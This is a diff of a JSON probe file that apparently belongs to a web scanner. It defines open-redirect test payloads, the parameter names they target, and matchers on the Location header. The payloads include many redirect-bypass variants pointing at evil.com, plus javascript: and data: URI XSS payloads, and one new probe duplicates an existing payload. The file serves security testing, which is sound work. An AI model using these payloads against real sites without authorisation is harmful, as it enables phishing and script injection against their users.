@@ -1,95 +1,253 @@
 {
   "category": "open_redirect",
-  "chain_with": ["oauth", "dom_xss", "info_disclosure", "csrf"],
+  "chain_with": [
+    "oauth",
+    "dom_xss",
+    "info_disclosure",
+    "csrf"
+  ],
   "contexts": {
     "url_param": {
       "description": "Open redirect via URL parameters",
       "tech_match": [],
-      "param_match": ["redirect", "url", "next", "return", "redir", "goto", "dest", "destination", "continue", "return_url", "redirect_uri", "callback", "forward", "target", "ref", "back"],
+      "param_match": [
+        "redirect",
+        "url",
+        "next",
+        "return",
+        "redir",
+        "goto",
+        "dest",
+        "destination",
+        "continue",
+        "return_url",
+        "redirect_uri",
+        "callback",
+        "forward",
+        "target",
+        "ref",
+        "back"
+      ],
       "probes": [
         {
           "payload": "https://evil.com",
           "description": "Absolute URL redirect to external domain",
-          "matchers": [{"type": "header", "name": "Location", "contains": "evil.com"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 40
         },
         {
           "payload": "//evil.com",
           "description": "Protocol-relative redirect bypass",
-          "matchers": [{"type": "header", "name": "Location", "contains": "evil.com"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 40
         },
         {
           "payload": "/\\evil.com",
           "description": "Backslash redirect bypass",
-          "matchers": [{"type": "header", "name": "Location", "contains": "evil.com"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 35
         },
         {
           "payload": "https://evil.com%2F%2F",
           "description": "URL-encoded slash redirect bypass",
-          "matchers": [{"type": "header", "name": "Location", "contains": "evil.com"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 35
         },
         {
           "payload": "https://target.com@evil.com",
           "description": "At-sign URL authority confusion",
-          "matchers": [{"type": "header", "name": "Location", "contains": "evil.com"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 35
         },
         {
           "payload": "javascript:alert(document.domain)",
           "description": "JavaScript protocol in redirect (XSS via redirect)",
-          "matchers": [{"type": "header", "name": "Location", "contains": "javascript:"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "javascript:"
+            }
+          ],
           "severity": "high",
           "confidence_boost": 45
         },
         {
           "payload": "///evil.com",
           "description": "Triple slash bypass — some parsers strip two leading slashes and treat remainder as path",
-          "matchers": [{"type": "header", "name": "Location", "contains": "evil.com"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 35
         },
         {
           "payload": "////evil.com",
           "description": "Quadruple slash bypass — parser normalisation edge case",
-          "matchers": [{"type": "header", "name": "Location", "contains": "evil.com"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 30
         },
         {
           "payload": "https:evil.com",
           "description": "Missing slashes — some lenient parsers accept scheme:host without //",
-          "matchers": [{"type": "header", "name": "Location", "contains": "evil.com"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 25
         },
         {
           "payload": "//evil%E3%80%82com",
           "description": "Unicode full-width dot bypass (。= U+3002) — some parsers normalise to ASCII dot before redirecting",
-          "matchers": [{"type": "header", "name": "Location"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location"
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 25
         },
         {
           "payload": "/%0d/evil.com",
           "description": "CRLF in path redirect — %0d causes some servers to treat remainder as new header line",
-          "matchers": [{"type": "header", "name": "Location", "contains": "evil.com"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
           "severity": "medium",
           "confidence_boost": 30
         },
         {
           "payload": "data:text/html,<script>alert(document.domain)</script>",
           "description": "data: URI XSS via redirect — browser executes data URI contents, yielding XSS",
-          "matchers": [{"type": "header", "name": "Location", "contains": "data:"}],
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "data:"
+            }
+          ],
           "severity": "high",
           "confidence_boost": 40
+        },
+        {
+          "payload": "/%2f%2fevil.com",
+          "description": "Protocol-relative via encoded double-slash — //evil.com after decode",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "/%5cevil.com",
+          "description": "Backslash-slash confusion — browsers treat \\ as / ; bypasses / filters",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "////evil.com/%2f%2e%2e",
+          "description": "Quad-slash + encoded /.. path confusion to external host",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 38
+        },
+        {
+          "payload": "/%09/evil.com",
+          "description": "Tab (%09) before host — some parsers strip it, redirect resolves external",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil.com"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 38
+        },
+        {
+          "payload": "//evil%E3%80%82com",
+          "description": "Ideographic full-stop (U+3002) as dot — normalized to evil.com by some resolvers",
+          "matchers": [
+            {
+              "type": "header",
+              "name": "Location",
+              "contains": "evil"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
         }
       ]
     }
